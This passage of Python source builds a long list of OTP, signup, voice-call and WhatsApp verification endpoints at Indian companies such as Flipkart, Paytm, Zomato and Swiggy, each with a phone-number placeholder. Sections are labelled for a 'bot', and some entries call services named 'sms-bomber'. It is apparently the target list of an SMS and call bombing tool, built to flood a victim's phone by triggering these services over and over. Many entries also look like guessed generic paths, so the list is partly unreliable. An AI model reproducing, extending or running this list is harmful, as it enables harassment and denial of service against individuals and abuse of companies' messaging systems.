    E.append({"name":"MeruCab_New","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","DeviceType":"Android"},"data":"mobile_number={t}"})
    E.append({"name":"PenPencil_New","method":"POST","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","headers":{"Content-Type":"application/json"},"data":'{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{t}"}'})
    E.append({"name":"Dayco_New","method":"POST","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"api=send_otp&brand=dayco&mob={t}&resend_otp=resend_otp"})
    E.append({"name":"LendingPlate","method":"POST","url":"https://lendingplate.com/api.php","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobiles={t}&resend=Resend"})
    E.append({"name":"NewMe","method":"POST","url":"https://prodapi.newme.asia/web/otp/request","headers":{"Content-Type":"application/json"},"data":'{"mobile_number":"{t}","resend_otp_request":true}'})
    E.append({"name":"Smytten","method":"POST","url":"https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode","headers":{"Content-Type":"application/json","UUID":"8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},"data":'{"phone":"{t}","email":"sdhabai09@gmail.com"}'})
    E.append({"name":"CaratLane","method":"POST","url":"https://www.caratlane.com/cg/dhevudu","headers":{"Content-Type":"application/json"},"data":'{"query":"mutation { SendOtp(input: { mobile: \\"{t}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }) { status { message code } } }"}'})
    E.append({"name":"WellAcademy","method":"POST","url":"https://wellacademy.in/store/api/numberLoginV2","headers":{"Content-Type":"application/json"},"data":'{"contact_no":"{t}"}'})
    E.append({"name":"ServeTel_New","method":"POST","url":"https://api.servetel.in/v1/auth/otp","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile_number={t}"})
    E.append({"name":"GoPink_New","method":"POST","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","headers":{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},"data":"check_mobile_number=1&contact={t}"})
    E.append({"name":"Shemaroome","method":"POST","url":"https://www.shemaroome.com/users/resend_otp","headers":{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},"data":"mobile_no=%2B91{t}"})
    E.append({"name":"Cossouq","method":"POST","url":"https://www.cossouq.com/mobilelogin/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobilenumber={t}&otptype=register"})
    E.append({"name":"MyImagineStore","method":"POST","url":"https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile={t}"})
    E.append({"name":"Otpless","method":"POST","url":"https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","selectedCountryCode":"+91"}'})
    E.append({"name":"MyHubble","method":"POST","url":"https://api.myhubble.money/v1/auth/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phoneNumber":"{t}","channel":"SMS"}'})
    E.append({"name":"TataCapital_Business","method":"POST","url":"https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}'})
    E.append({"name":"DealShare_New","method":"POST","url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","hashCode":"k387IsBaTmn"}'})
    E.append({"name":"Snapmint","method":"POST","url":"https://api.snapmint.com/v1/public/sign_up","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Housing_New","method":"POST","url":"https://login.housing.com/api/v2/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name":"RentoMojo","method":"POST","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Nykaa_New","method":"POST","url":"https://www.nykaa.com/app-api/index.php/customer/send_otp","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"source=sms&app_version=3.0.9&mobile_number={t}&platform=ANDROID&domain=nykaa"})
    E.append({"name":"Animall","method":"POST","url":"https://animall.in/zap/auth/login","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","signupPlatform":"NATIVE_ANDROID"}'})
    E.append({"name":"Entri","method":"POST","url":"https://entri.app/api/v3/users/check-phone/","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Aakash_New","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile_number":"{t}","activity_type":"aakash-myadmission"}'})
    E.append({"name":"Revv","method":"POST","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","deviceType":"website"}'})
    E.append({"name":"DeHaat","method":"POST","url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","client_id":"kisan-app"}'})
    E.append({"name":"A23_Games","method":"POST","url":"https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","device_id":"android123","model":"Google,Android SDK built for x86,10"}'})
    E.append({"name":"Spencers","method":"POST","url":"https://jiffy.spencers.in/user/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PayMeIndia","method":"POST","url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","app_signature":"S10ePIIrbH3"}'})
    E.append({"name":"ShoppersStop","method":"POST","url":"https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","type":"SIGNIN_WITH_MOBILE"}'})
    E.append({"name":"HyugaAuth","method":"POST","url":"https://hyuga-auth-service.pratech.live/v1/auth/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"LifestyleStores","method":"POST","url":"https://www.lifestylestores.com/in/en/mobilelogin/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"signInMobile":"{t}","channel":"sms"}'})
    E.append({"name":"MamaEarth_New","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"HomeTriangle","method":"POST","url":"https://hometriangle.com/api/partner/xauth/signup/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"WellnessForever","method":"POST","url":"https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":'method=firstRegisterApi&data={"customerMobile":"{t}","generateOtp":"true"}'})
    E.append({"name":"HealthMug","method":"POST","url":"https://api.healthmug.com/account/createotp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Kredily","method":"POST","url":"https://app.kredily.com/ws/v1/accounts/send-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataMotors","method":"POST","url":"https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","sendOtp":"true"}'})
    E.append({"name":"Moglix","method":"POST","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","buildVersion":"24.0"}'})
    E.append({"name":"TrulyMadly","method":"POST","url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","locale":"IN"}'})
    E.append({"name":"Apna_New","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","hash_type":"play_store"}'})
    E.append({"name":"Swipe","method":"POST","url":"https://app.getswipe.in/api/user/mobile_login","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","resend":true}'})
    E.append({"name":"CountryDelight_New","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","platform":"Android","mode":"new_user"}'})
    E.append({"name":"Rapido","method":"POST","url":"https://customer.rapido.bike/api/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"BetterHalf","method":"POST","url":"https://api.betterhalf.ai/v2/auth/otp/send/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","isd_code":"91"}'})
    E.append({"name":"NuvamaWealth","method":"POST","url":"https://nma.nuvamawealth.com/edelmw-content/content/otp/register","headers":{"Content-Type":"application/json"},"data":'{"mobileNo":"{t}","emailID":"test@example.com"}'})
    E.append({"name":"Mpokket","method":"POST","url":"https://web-api.mpokket.in/registration/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"MoreRetail","method":"POST","url":"https://omni-api.moreretail.in/api/v1/login/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","hash_key":"XfsoCeXADQA"}'})
    E.append({"name":"Charzer","method":"POST","url":"https://api.charzer.com/auth-service/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","appSource":"CHARZER_APP"}'})
    E.append({"name":"BikeFixup","method":"POST","url":"https://api.bikefixup.com/api/v2/send-registration-otp","headers":{"Content-Type":"application/json","client":"app"},"data":'{"phone":"{t}","app_signature":"4pFtQJwcz6y"}'})
    E.append({"name":"Foxy_SMS","method":"POST","url":"https://www.foxy.in/api/v2/users/send_otp","headers":{"Content-Type":"application/json","Platform":"web"},"data":'{"user":{"phone_number":"+91{t}"},"via":"sms"}'})
    E.append({"name":"Licius_New","method":"POST","url":"https://www.licious.in/api/login/signup","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","captcha_token":null}'})

    # =====================================================================
    # SECTION 3 — GET APIs (bot)
    # =====================================================================
    E.append({"name":"BomberWorker","method":"GET","url":"http://sms-bomber.subhxcosmo.workers.dev/api?num={t}","headers":{},"data":None})
    E.append({"name":"BomberVercel","method":"GET","url":"https://bomberrr.vercel.app/?key=roots&number={t}","headers":{},"data":None})
    E.append({"name":"Bolbet","method":"GET","url":"https://bolbet-liart.vercel.app/?key=roots&number={t}","headers":{},"data":None})
    E.append({"name":"RedBus_New","method":"GET","url":"https://m.redbus.in/api/getOtp?number={t}&cc=91","headers":{},"data":None})
    E.append({"name":"Univest","method":"GET","url":"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={t}","headers":{},"data":None})
    E.append({"name":"WorkIndia","method":"GET","url":"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={t}&version_number=623","headers":{},"data":None})
    E.append({"name":"Jockey_SMS","method":"GET","url":"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{t}?whatsapp=false","headers":{},"data":None})
    E.append({"name":"Vyapar","method":"GET","url":"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={t}","headers":{},"data":None})
    E.append({"name":"ConfirmTkt_New","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}","headers":{},"data":None})
    E.append({"name":"CodFirm","method":"GET","url":"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{t}&email=&storeUrl=bellavita1.myshopify.com","headers":{},"data":None})
    E.append({"name":"Coolwinks_New","method":"GET","url":"https://api.coolwinks.com/api/accounts/is_already_registered/?username={t}","headers":{},"data":None})
    E.append({"name":"Zee5","method":"GET","url":"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={t}","headers":{},"data":None})

    # =====================================================================
    # SECTION 4 — Voice Calls (bot)
    # =====================================================================
    E.append({"name":"Myntra_Call_New","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Flipkart_Call_New","method":"POST","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Paytm_Call","method":"POST","url":"https://accounts.paytm.com/signin/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zomato_Call","method":"POST","url":"https://www.zomato.com/php/o2_api_handler.php","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&type=voice"})
    E.append({"name":"Ola_Call","method":"POST","url":"https://api.olacabs.com/v1/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Uber_Call","method":"POST","url":"https://auth.uber.com/v2/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Kotak_Call","method":"POST","url":"https://www.kotak.com/api/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Amazon_Call","method":"POST","url":"https://www.amazon.in/ap/signin","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&action=voice_otp"})

    # =====================================================================
    # SECTION 5 — WhatsApp
    # =====================================================================
    E.append({"name":"KPN_WA_New","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6","headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","content-type":"application/json; charset=UTF-8"},"data":'{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{t}"}}'})
    E.append({"name":"KPN_WA_New2","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0","headers":{"x-app-id":"d7547338-c70e-4130-82e3-1af74eda6797","content-type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"Foxy_WA","method":"POST","url":"https://www.foxy.in/api/v2/users/send_otp","headers":{"Content-Type":"application/json"},"data":'{"user":{"phone_number":"+91{t}"},"via":"whatsapp"}'})
    E.append({"name":"Stratzy_WA","method":"POST","url":"https://stratzy.in/api/web/whatsapp/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"phoneNo":"{t}"}'})
    E.append({"name":"Jockey_WA","method":"GET","url":"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{t}?whatsapp=true","headers":{},"data":None})
    E.append({"name":"Rappi_WA","method":"POST","url":"https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create","headers":{"Content-Type":"application/json"},"data":'{"country_code":"+91","phone":"{t}"}'})
    E.append({"name":"EkaCare_WA","method":"POST","url":"https://auth.eka.care/auth/init","headers":{"Content-Type":"application/json","Client-Id":"androidp"},"data":'{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
    E.append({"name":"KPN_WA_New3","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0","headers":{"x-app-id":"d7547338-c70e-4130-82e3-1af74eda6797","content-type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"},"notification_channel":"WHATSAPP"}'})

    # =====================================================================
    # SECTION 6 — #Hotstar.txt UNIQUE (already-present dupes skipped)
    # =====================================================================
    E.append({"name":"Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-hs-platform":"PCTV","x-country-code":"IN","Origin":"https://www.hotstar.com","Referer":"https://www.hotstar.com/in/subscribe/sign-in"},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
    E.append({"name":"ALTBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.altbalaji.com","Referer":"https://www.altbalaji.com/user-detail?pid=NTU%3D"},"data":'{"phone_number":"{t}","country_code":"91","platform":"web"}'})
    E.append({"name":"SonyLIV","method":"POST","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app_version":"3.1.20","Origin":"https://www.sonyliv.com","Referer":"https://www.sonyliv.com/"},"data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN"}'})
    E.append({"name":"Apollo247","method":"POST","url":"https://webapi.apollo247.com/","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.apollo247.com","Referer":"https://www.apollo247.com/medicines"},"data":'{"operationName":"Login","variables":{"mobileNumber":"+91{t}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) { login(mobileNumber: $mobileNumber, loginType: $loginType) { status message loginId __typename } }"}'})
    E.append({"name":"FBBOnline","method":"POST","url":"https://www.fbbonline.in/customer/account/GenerateOtp","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"X-Requested-With":"XMLHttpRequest","Origin":"https://www.fbbonline.in","Referer":"https://www.fbbonline.in/customer/account/create"},"data":"RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={t}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=test&RegistrationForm%5Blast_name%5D=test&RegistrationForm%5Bpassword%5D=test1234&RegistrationForm%5Btc_opt_in%5D=on"})
    E.append({"name":"Grofers","method":"POST","url":"https://grofers.com/v2/accounts/","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://grofers.com","Referer":"https://grofers.com/","app_client":"consumer_web"},"data":"user_phone={t}"})
    E.append({"name":"Zomato","method":"POST","url":"https://www.zomato.com/webroutes/auth/login","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.zomato.com","Referer":"https://www.zomato.com/"},"data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
    E.append({"name":"Dream11_GraphQL","method":"POST","url":"https://www.dream11.com/graphql/mutation/pwa/register","headers":{"Content-Type":"application/json","User-Agent":UA_D,"device":"pwa","Origin":"https://www.dream11.com","Referer":"https://www.dream11.com/register?ru="},"data":'{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"test@gmail.com","mobileNumber":"{t}","password":"test@123astronomia"}}'})
    E.append({"name":"Careers360","method":"POST","url":"https://www.careers360.com/ajax/no-cache/user/otp-send","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"X-Requested-With":"XMLHttpRequest","Origin":"https://www.careers360.com","Referer":"https://www.careers360.com/"},"data":"mobile_number={t}&method=call"})
    E.append({"name":"Cansell_Signup_Hotstar","method":"POST","url":"https://webapi.cansell.in/api/User/SignUp","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://m.cansell.in","Referer":"https://m.cansell.in/register"},"data":'{"name":"test","surname":"test","email":"test@gmail.com","phone":"{t}","password":"test123"}'})
    E.append({"name":"IndiaTimes_Gaana","method":"POST","url":"https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":UA_D,"appVersion":"8.9.0","channel":"gaana.com","platform":"android"},"data":'{"mobile":"+91-{t}"}'})
    E.append({"name":"Flipkart_Rome","method":"POST","url":"https://1.rome.api.flipkart.com/1/action/view","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-user-agent":UA_D,"Origin":"https://www.flipkart.com","Referer":"https://www.flipkart.com/login"},"data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'})
    E.append({"name":"Paytm_Register","method":"POST","url":"https://accounts.paytm.com/v2/api/register","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://accounts.paytm.com","Referer":"https://accounts.paytm.com/"},"data":'{"email":"","mobile":"{t}","loginPassword":"Test@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'})
    E.append({"name":"Ogonn","method":"POST","url":"https://ogonn.in/otp","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"Origin":"https://ogonn.in","Referer":"https://ogonn.in/login","X-Requested-With":"XMLHttpRequest"},"data":"mobile={t}"})
    E.append({"name":"Swiggy_Signup","method":"POST","url":"https://www.swiggy.com/mapi/auth/signup","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com","Referer":"https://www.swiggy.com/auth/register"},"data":'{"name":"test","email":"test@gmail.com","password":"test1234","mobile":"{t}"}'})
    E.append({"name":"Limeroad","method":"POST","url":"https://www.limeroad.com/auth/get_uuid_v2?ajax=true","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://www.limeroad.com","Referer":"https://www.limeroad.com/"},"data":"user_id={t}"})
    E.append({"name":"AJIO_Signup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.ajio.com","Referer":"https://www.ajio.com/signup"},"data":'{"firstName":"test","login":"test@gmail.com","password":"test@123nxnxn","mobileNumber":"{t}","requestType":"SENDOTP"}'})
    E.append({"name":"BigBasket_OTP","method":"POST","url":"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.bigbasket.com","Referer":"https://www.bigbasket.com/auth/login/","x-channel":"BB-PWA"},"data":'{"identifier":"{t}"}'})
    E.append({"name":"Banggood","method":"POST","url":"https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://m.banggood.in","Referer":"https://m.banggood.in/login.html"},"data":"mobilePhone={t}&countryPhoneCode=91&type=1"})
    E.append({"name":"UrbanClap","method":"POST","url":"https://www.urbanclap.com/api/v2/growth/profile/generateOTP","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.urbancompany.com","Referer":"https://www.urbancompany.com/"},"data":'{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{t}"},"device_type":"customer"}'})
    E.append({"name":"Quikr","method":"POST","url":"https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3","headers":{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.quikr.com","Referer":"https://www.quikr.com/SignIn"},"data":"user={t}&v3=true"})
    E.append({"name":"Kotak811","method":"POST","url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.kotak.com","Referer":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action"},"data":"cust_full_name=Test&cust_email=test%40gmail.com&cust_mobile={t}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"})
    E.append({"name":"HappyEasyGo","method":"GET","url":"https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{t}","headers":{"User-Agent":UA_D,"Referer":"https://m.happyeasygo.com/register","x-device":"mobile"},"data":None})
    E.append({"name":"MakeMyTrip","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.makemytrip.com","Referer":"https://www.makemytrip.com/","region":"in"},"data":'{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})
    E.append({"name":"Ola_Login","method":"POST","url":"https://accounts.olacabs.com/api/login","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://accounts.olacabs.com","Referer":"https://accounts.olacabs.com/"},"data":'{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN"}'})
    E.append({"name":"OYO","method":"POST","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","headers":{"Content-Type":"text/plain;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.oyorooms.com","Referer":"https://www.oyorooms.com/login"},"data":'{"phone":"{t}","country_code":"+91","nod":4}'})
    E.append({"name":"Dominos","method":"POST","url":"https://api.dominos.co.in/loginhandler/forgotpassword","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://m.dominos.co.in","Referer":"https://m.dominos.co.in/"},"data":'{"lastName":"","mobile":"{t}","firstName":""}'})
    E.append({"name":"KFC_New","method":"POST","url":"https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://online.kfc.co.in","Referer":"https://online.kfc.co.in/login"},"data":'{"phoneNumber":"{t}","AuthorizedFor":"3","Resend":"false"}'})
    E.append({"name":"BurgerKing","method":"POST","url":"https://consumer-apis.burgerking.in/api/v1/user/signUp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.burgerking.in","Referer":"https://www.burgerking.in/","platform":"web"},"data":'{"phone_no":"{t}"}'})
    E.append({"name":"Purplle_Get","method":"GET","url":"https://www.purplle.com/api/account/authorization/send_otp?phone={t}&action=register","headers":{"User-Agent":UA_D,"Referer":"https://www.purplle.com/login"},"data":None})
    E.append({"name":"Tatacliq","method":"POST","url":"https://www.tatacliq.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.tatacliq.com","Referer":"https://www.tatacliq.com/login"},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Myntra_Post","method":"POST","url":"https://www.myntra.com/api/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.myntra.com","Referer":"https://www.myntra.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"Nykaa_Post","method":"POST","url":"https://www.nykaa.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.nykaa.com","Referer":"https://www.nykaa.com/login"},"data":'{"mobile":"{t}","country_code":"91"}'})
    E.append({"name":"PharmEasy_Post","method":"POST","url":"https://api.pharmeasy.in/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.pharmeasy.in","Referer":"https://www.pharmeasy.in/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"1mg_Post","method":"POST","url":"https://api.1mg.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.1mg.com","Referer":"https://www.1mg.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"HealthKart_Post","method":"POST","url":"https://www.healthkart.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.healthkart.com","Referer":"https://www.healthkart.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"Cultfit_Post","method":"POST","url":"https://api.cult.fit/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.cult.fit","Referer":"https://www.cult.fit/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"FabIndia","method":"POST","url":"https://www.fabindia.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.fabindia.com","Referer":"https://www.fabindia.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"Pepperfry","method":"POST","url":"https://www.pepperfry.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.pepperfry.com","Referer":"https://www.pepperfry.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"FirstCry","method":"POST","url":"https://www.firstcry.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.firstcry.com","Referer":"https://www.firstcry.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"Clovia","method":"POST","url":"https://www.clovia.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.clovia.com","Referer":"https://www.clovia.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"Bewakoof","method":"POST","url":"https://www.bewakoof.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.bewakoof.com","Referer":"https://www.bewakoof.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"SouledStore","method":"POST","url":"https://www.souledstore.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.souledstore.com","Referer":"https://www.souledstore.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
